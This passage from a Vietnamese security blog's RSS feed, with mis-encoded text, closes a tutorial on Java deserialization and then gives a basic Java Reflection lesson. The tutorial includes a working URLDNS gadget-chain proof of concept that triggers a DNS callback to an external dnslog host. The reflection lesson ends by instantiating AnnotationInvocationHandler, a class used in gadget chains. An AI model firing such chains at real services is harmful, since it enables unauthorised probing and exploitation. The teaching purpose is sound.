lÃ  -1 ná»¯a, khi Ä‘Ã³ trong quÃ¡ trÃ¬nh deserialize request sáº½ khÃ´ng Ä‘Æ°á»£c gá»­i Ä‘áº¿n. Váº­y nÃªn sau khi thá»±c hiá»‡n deserialize, chÃºng ta cáº§n thá»±c hiá»‡n set láº¡i giÃ¡ trá»‹ cho hashcode lÃ  -1. Tuy nhiÃªn váº¥n Ä‘á» á»Ÿ Ä‘Ã¢y lÃ  biáº¿n hashcode lÃ  private, Ä‘á»ƒ gÃ¡n láº¡i giÃ¡ trá»‹ cho biáº¿n private chÃºng ta cáº§n sá»­ dá»¥ng Ä‘áº¿n Reflection mÃ  mÃ¬nh Ä‘Ã£ cÃ³ bÃ i viáº¿t vá» nÃ³.<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/HashCodeOfURLObject.webp"></p><h3 id="POC-hoan-thien-cua-chuoi-URLDNS"><a href="#POC-hoan-thien-cua-chuoi-URLDNS" class="headerlink" title="POC hoÃ n thiá»‡n cá»§a chuá»—i URLDNS:"></a>POC hoÃ n thiá»‡n cá»§a chuá»—i URLDNS:</h3><p>file: SerializeTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BasicChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;Ser2.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://2g1hil.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcode</span> <span class="operator">=</span> URL.class.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        <span class="comment">//Field hashcode = url.getClass().getDeclaredField(&quot;hashCode&quot;); CÃ¡ch khÃ¡c Ä‘á»ƒ láº¥y field hashcode</span></span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line">        hashcode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcode.set(url, -<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>file: Deser.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BasicChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Deser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Deserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        Deserialize(<span class="string">&quot;ser2.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Káº¿t quáº£:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/DNSresult.webp"></p><p>Váº­y lÃ  mÃ¬nh Ä‘Ã£ giá»›i thiá»‡u xong vá» cÆ¡ báº£n cá»§a quÃ¡ trÃ¬nh Deserialization vÃ  Ä‘i qua háº¿t chuá»—i URLDNS. ÄÃ¢y chá»‰ lÃ  nhá»¯ng kiáº¿n thá»©c cÆ¡ báº£n cá»§a lá»— há»•ng Java Deserialization. Äá»ƒ hiá»ƒu sÃ¢u hÆ¡n vá» lá»— há»•ng nÃ y, mÃ¬nh thá»±c sá»± khuyÃªn cÃ¡c báº¡n hÃ£y hiá»ƒu tÆ°á»ng táº­n vá» nhá»¯ng keyword sau: â€œClass Classâ€, â€œClass Objectâ€, â€œClass Runtimeâ€, â€œReflectionâ€, cÃ¡c khÃ¡i niá»‡m vá» OOP, vÃ  cÃ²n nhiá»u thá»© khÃ¡c ná»¯a. VÃ  hÃ£y cá»‘ gáº¯ng Ä‘á»c hiá»ƒu vÃ  tá»± mÃ¬nh viáº¿t POC cho lá»— há»•ng nÃ y, khÃ¡ khÃ³ Ä‘á»ƒ báº¯t Ä‘áº§u nhÆ°ng hi vá»ng cÃ¡c báº¡n cÃ³ thá»ƒ vÆ°á»£t qua.</p><blockquote><p>HÃ nh trÃ¬nh nÃ o mÃ  khÃ´ng cÃ³ gian nan, Ä‘au khá»• ^^â€¦ ChÃºc cÃ¡c báº¡n há»c tá»‘t~</p></blockquote>]]></content:encoded>
      
      
      <category domain="https://rayinaw.github.io/categories/Java/">Java</category>
      
      <category domain="https://rayinaw.github.io/categories/Java/Deserialization/">Deserialization</category>
      
      
      <category domain="https://rayinaw.github.io/tags/Java/">Java</category>
      
      <category domain="https://rayinaw.github.io/tags/Deserialization/">Deserialization</category>
      
      
      <comments>https://rayinaw.github.io/2022/11/03/JavaDeserializationBasic/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Java Reflection</title>
      <link>https://rayinaw.github.io/2022/11/02/Java-reflection/</link>
      <guid>https://rayinaw.github.io/2022/11/02/Java-reflection/</guid>
      <pubDate>Wed, 02 Nov 2022 16:23:23 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Lá»›p Java Reflection lÃ  má»™t lá»›p thÆ°á»ng xuyÃªn Ä‘Æ°á»£c sá»­ dá»¥ng vÃ¬ sá»± tiá»‡n nghi cá»§a nÃ³, nÃªn chÃºng ta cÅ©ng cÃ³ thá»ƒ thÆ°á»ng xuyÃªn tháº¥y nhá»¯ng lá»›p nÃ y</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Lá»›p Java Reflection lÃ  má»™t lá»›p thÆ°á»ng xuyÃªn Ä‘Æ°á»£c sá»­ dá»¥ng vÃ¬ sá»± tiá»‡n nghi cá»§a nÃ³, nÃªn chÃºng ta cÅ©ng cÃ³ thá»ƒ thÆ°á»ng xuyÃªn tháº¥y nhá»¯ng lá»›p nÃ y khi Ä‘i sÃ¢u vÃ o nhá»¯ng lá»— há»•ng cá»§a Java. NgoÃ i ra, trong Java Deserialization ta thÆ°á»ng dÃ¹ng lá»›p nÃ y Ä‘á»ƒ cÃ³ thá»ƒ truy cáº­p vÃ o cÃ¡c thuá»™c tÃ­nh Private. </p><p>TrÆ°á»›c khi Ä‘á»c bÃ i viáº¿t nÃ y, cÃ¡c báº¡n nÃªn tÃ¬m hiá»ƒu lá»›p Class, Object.</p><p>Táº£n máº¡n tháº¿ lÃ  Ä‘á»§ rá»“i, ta cÃ¹ng Ä‘i vÃ o bÃ i viáº¿t nÃ o o(ï¿£â–½ï¿£)ãƒ–</p><h1 id="Java-Reflection"><a href="#Java-Reflection" class="headerlink" title="Java Reflection"></a>Java Reflection</h1><h2 id="1-Khai-niem"><a href="#1-Khai-niem" class="headerlink" title="1. KhÃ¡i niá»‡m:"></a>1. KhÃ¡i niá»‡m:</h2><p>Reflection lÃ  má»™t tÃ­nh nÄƒng cá»§a java, nÃ³ cho phÃ©p má»™t chÆ°Æ¡ng trÃ¬nh Ä‘ang cháº¡y trá»±c tiáº¿p láº¥y ra cÃ¡c thuá»™c tÃ­nh, phÆ°Æ¡ng thá»©c,â€¦ vÃ  thao tÃ¡c vá»›i nÃ³.</p><p>Má»™t Ä‘iá»ƒm Ä‘áº·c biá»‡t cá»§a Java reflection lÃ  nÃ³ cho phÃ©p thay Ä‘á»•i cÃ¡c thuá»™c tÃ­nh Private cá»§a má»™t Object.</p><h2 id="2-Cac-ham-cua-Java-reflection"><a href="#2-Cac-ham-cua-Java-reflection" class="headerlink" title="2. CÃ¡c hÃ m cá»§a Java reflection:"></a>2. CÃ¡c hÃ m cá»§a Java reflection:</h2><p>á» Ä‘Ã¢y mÃ¬nh chá»‰ liá»‡t kÃª ra nhá»¯ng hÃ m thÆ°á»ng dÃ¹ng cá»§a Reflection.</p><h3 id="Lay-ra-thuoc-tinh-cua-mot-lop-Field"><a href="#Lay-ra-thuoc-tinh-cua-mot-lop-Field" class="headerlink" title="Láº¥y ra thuá»™c tÃ­nh cá»§a má»™t lá»›p (Field):"></a>Láº¥y ra thuá»™c tÃ­nh cá»§a má»™t lá»›p (Field):</h3><p>Trong lá»›p Class cÃ³ hai phÆ°Æ¡ng thá»©c Ä‘á»ƒ láº¥y ra trÆ°á»ng á»Ÿ trong má»™t lá»›p lÃ  getDeclaredFields() vÃ  getDeclaredField(String name).</p><ul><li>PhÆ°Æ¡ng thá»©c getDeclaredFields() sáº½ láº¥y ra táº¥t cáº£ nhá»¯ng trÆ°á»ng cÃ³ á»Ÿ trong class cá»§a object Ä‘Ã³.</li><li>PhÆ°Æ¡ng thá»©c getDeclaredField(String name) sáº½ láº¥y ra má»™t trÆ°á»ng cÃ³ tÃªn lÃ  String mÃ  chÃºng ta truyá»n vÃ o.</li></ul><p>Hai phÆ°Æ¡ng thá»©c nÃ y tÆ°Æ¡ng tá»± nhau chá»‰ lÃ  phÆ°Æ¡ng thá»©c getDeclaredFields() sáº½ láº¥y ra táº¥t cáº£ cÃ¡c field cá»§a Class Ä‘Ã³ rá»“i cho vÃ o má»™t máº£ng nÃªn cÃ¡c báº¡n tá»± tÃ¬m hiá»ƒu nhÃ©..</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">person</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">person</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person: &quot;</span>+ <span class="string">&quot;name = &#x27;&quot;</span>+ name + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflectionClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">person</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">person</span>(<span class="string">&quot;helen&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> a.getClass().getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);<span class="comment">//Cho phÃ©p truy cáº­p táº¡m thá»i vÃ o biáº¿n name Ä‘á»ƒ thay Ä‘á»•i, Ä‘Ã¢y lÃ  cÃ¡i hay cá»§a reflection.</span></span><br><span class="line">        name.set(a, <span class="string">&quot;Sayo&quot;</span>);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Lay-ra-phuong-thuc-cua-mot-lop"><a href="#Lay-ra-phuong-thuc-cua-mot-lop" class="headerlink" title="Láº¥y ra phÆ°Æ¡ng thá»©c cá»§a má»™t lá»›p:"></a>Láº¥y ra phÆ°Æ¡ng thá»©c cá»§a má»™t lá»›p:</h3><table><thead><tr><th>Method</th><th>Public</th><th>Non-public</th><th>Inherited</th></tr></thead><tbody><tr><td>getMethod &amp; getMethods</td><td>âœ”ï¸</td><td>âŒ</td><td>âœ”ï¸</td></tr><tr><td>getDeclaredMethod &amp; getDeclaredMethods</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âŒ</td></tr></tbody></table><ul><li><h4 id="Phuong-thuc-getMethod-va-getMethods"><a href="#Phuong-thuc-getMethod-va-getMethods" class="headerlink" title="PhÆ°Æ¡ng thá»©c getMethod() vÃ  getMethods():"></a>PhÆ°Æ¡ng thá»©c getMethod() vÃ  getMethods():</h4>HÃ m getMethod() vÃ  getMethods() sáº½ cÃ³ thá»ƒ láº¥y nhá»¯ng method public vÃ  nhá»¯ng method Ä‘Æ°á»£c káº¿ thá»«a tá»« lá»›p cha cá»§a nÃ³. Lá»›p getMethod() sáº½ tráº£ vá» má»™t phÆ°Æ¡ng thá»©c xÃ¡c Ä‘á»‹nh, cÃ²n lá»›p getMethods() sáº½ tráº£ vá» má»™t máº£ng cÃ¡c phÆ°Æ¡ng thá»©c.</li><li><h4 id="Phuong-thuc-getDeclaredMethod-va-getDeclaredMethods"><a href="#Phuong-thuc-getDeclaredMethod-va-getDeclaredMethods" class="headerlink" title="PhÆ°Æ¡ng thá»©c getDeclaredMethod() vÃ  getDeclaredMethods():"></a>PhÆ°Æ¡ng thá»©c getDeclaredMethod() vÃ  getDeclaredMethods():</h4>HÃ m getDeclaredMethod() vÃ  getDeclaredMethods() sáº½ láº¥y ra nhá»¯ng phÆ°Æ¡ng thá»©c Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a á»Ÿ trong class hiá»‡n táº¡i, bao gá»“m cáº£ Public vÃ  Non-public nhÆ°ng khÃ´ng thá»ƒ láº¥y nhá»¯ng class káº¿ thá»«a nhÆ° cá»§a getMethod(). TÆ°Æ¡ng tá»± nhÆ° váº­y, lá»›p getDeclaredMethod() sáº½ tráº£ vá» má»™t phÆ°Æ¡ng thá»©c xÃ¡c Ä‘á»‹nh, cÃ²n lá»›p getDeclaredMethods() sáº½ tráº£ vá» má»™t máº£ng cÃ¡c phÆ°Æ¡ng thá»©c.</li></ul><hr><p>CÃ¡c phÆ°Æ¡ng thá»©c Ä‘á»u tÆ°Æ¡ng tá»± nhau nÃªn mÃ¬nh sáº½ chá»‰ Ä‘Æ°a ra má»™t vÃ­ dá»¥:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">person</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">person</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">(String a, String b)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Do something....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person: &quot;</span>+ <span class="string">&quot;name = &#x27;&quot;</span>+ name + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflectionClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">person</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">person</span>(<span class="string">&quot;helen&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> a.getClass().getMethod(<span class="string">&quot;work&quot;</span>, String.class, String.class);</span><br><span class="line">        method.invoke(a, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>Class.getMethod()</code> nháº­n tham sá»‘ Ä‘áº§u lÃ  string vá»›i tÃªn cá»§a method, cÃ¡c tham sá»‘ sau lÃ  lá»›p cá»§a Ä‘á»‘i sá»‘ mÃ  method cáº§n láº¥y ra nháº­n vÃ o. NhÆ° vÃ­ dá»¥ trÃªn, lá»›p work nháº­n vÃ o 2 tham sá»‘ lÃ  String nÃªn chÃºng ta sáº½ truyá»n vÃ o String.class,â€¦</p></li><li><p>method láº¥y ra bÃ¢y giá» lÃ  má»™t object cá»§a lá»›p <code>Method</code> bÃ¢y giá» nÃ³ Ä‘áº¡i diá»‡n cho cÃ¡c method cá»§a nhá»¯ng object thuá»™c chung má»™t class cÃ³ method Ä‘Æ°á»£c láº¥y ra. Trong lá»›p Method cÃ³ má»™t hÃ m invoke() dÃ¹ng Ä‘á»ƒ gá»i cÃ¡i method Ä‘Ã³. VÃ  Ä‘Æ°Æ¡ng nhiÃªn method bÃ¢y giá» chÆ°a pháº£i lÃ  cá»§a object nÃ o mÃ  nÃ³ chá»‰ chung chung, bÃ¢y giá» hÃ m invoke() sáº½ nháº­n Ä‘á»‘i sá»‘ Ä‘áº§u tiÃªn lÃ  object chá»©a method Ä‘Ã³, cÃ¡c giÃ¡ trá»‹ sau lÃ  cÃ¡c tham sá»‘ cá»§a method. </p></li><li><p>LÆ°u Ã½ method chá»‰ sá»­ dá»¥ng náº¿u cÃ¡c object lÃ  chung má»™t class.</p></li></ul><h3 id="Phuong-thuc-getConstructor-va-getConstructors"><a href="#Phuong-thuc-getConstructor-va-getConstructors" class="headerlink" title="PhÆ°Æ¡ng thá»©c getConstructor() vÃ  getConstructors():"></a>PhÆ°Æ¡ng thá»©c getConstructor() vÃ  getConstructors():</h3><p>PhÆ°Æ¡ng thá»©c nÃ y giÃºp chÃºng ta láº¥y ra má»™t Constructor cá»§a má»™t lá»›p vÃ  Ä‘Æ°a vÃ o lá»›p Constructor, tá»« Constructor Ä‘Æ°á»£c láº¥y ra, chÃºng ta cÃ³ thá»ƒ táº¡o má»™t Object báº±ng hÃ m newInstance() á»Ÿ trong lá»›p Constructor.<br>PhÆ°Æ¡ng thá»©c getConstructors() tÆ°Æ¡ng tá»±, chá»‰ khÃ¡c lÃ  nÃ³ sáº½ Ä‘Æ°a vÃ o máº£ng.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;person&gt; personClass = person.class;</span><br><span class="line">        Constructor&lt;person&gt; personConstructor = personClass.getConstructor(String.class);</span><br><span class="line">        <span class="type">person</span> <span class="variable">a</span> <span class="operator">=</span> personConstructor.newInstance(<span class="string">&quot;Makune&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;person: &quot;</span> + a);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="Lay-ra-mot-lop-ma-khong-the-thao-tac-truc-tiep"><a href="#Lay-ra-mot-lop-ma-khong-the-thao-tac-truc-tiep" class="headerlink" title="Láº¥y ra má»™t lá»›p mÃ  khÃ´ng thá»ƒ thao tÃ¡c trá»±c tiáº¿p:"></a>Láº¥y ra má»™t lá»›p mÃ  khÃ´ng thá»ƒ thao tÃ¡c trá»±c tiáº¿p:</h3><h4 id="Phuong-thuc-forName"><a href="#Phuong-thuc-forName" class="headerlink" title="PhÆ°Æ¡ng thá»©c forName"></a>PhÆ°Æ¡ng thá»©c forName</h4><p>Äá»ƒ láº¥y ra má»™t class chÃºng ta dÃ¹ng phÆ°Æ¡ng thá»©c forName.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">//Láº¥y ra lá»›p AnnotationInvocationHandler</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    <span class="comment">//Láº¥y ra Constructor cá»§a lá»›p AnnotationInvocationHandler</span></span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    <span class="comment">//Lá»›p nÃ y khá»Ÿi táº¡o default nÃªn chÃºng ta pháº£i setAccessible(true)</span></span><br><span class="line">    aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//Sá»­ dá»¥ng constructor</span></span><br><span class="line">    <span class="comment">//VÃ¬ chÃºng ta khÃ´ng cÃ³ quyá»n vá»›i lá»›p AnnotationInvocationHandler nÃªn chÃºng ta khÃ´ng thá»ƒ táº¡o Object kiá»ƒu AnnotationInvocationHandler, do Ä‘Ã³ chÃºng ta pháº£i Ä‘áº·t kiá»ƒu lÃ  Object hoáº·c kiá»ƒu mÃ  lá»›p AnnotationInvocationHandler káº¿ thá»«a.</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihConstructor.newInstance(Override.class, <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://rayinaw.github.io/categories/Java/">Java</category>
      
      <category domain="https://rayinaw.github.io/categories/Java/Programming/">Programming</category>
      
      
      <category domain="https://rayinaw.github.io/tags/Java/">Java</category>
      
      <category domain="https://rayinaw.github.io/tags/Reflection/">Reflection</category>
      
      <category domain="https://rayinaw.github.io/tags/Programming/">Programming</category>
      
      
      <comments>https://rayinaw.github.io/2022/11/02/Java-reflection/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
